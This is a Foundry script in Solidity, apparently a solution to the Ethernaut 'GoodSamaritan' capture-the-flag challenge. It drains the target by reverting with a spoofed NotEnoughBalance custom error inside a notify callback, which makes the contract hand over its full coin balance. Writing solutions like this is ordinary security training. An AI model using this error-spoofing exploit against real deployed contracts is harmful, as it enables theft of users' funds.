// SPDX-License-Indentifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/GoodSamaritan.sol";

contract GoodSamaritanSolution is INotifyable {
    GoodSamaritan goodSamaritan =
        GoodSamaritan(0x86fbA44B6f0f3144b1ae719030CAd272Ae784f31);
    Coin coin = Coin(address(goodSamaritan.coin()));
    error NotEnoughBalance();
    function run() external {
        // vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        goodSamaritan.requestDonation();
        // vm.stopBroadcast();
    }
    function notify(uint256 amount) external {
        if (amount <= 10) revert NotEnoughBalance();
        console.log(coin.balances(address(this)));
        console.log(coin.balances(address(goodSamaritan)));
    }
}
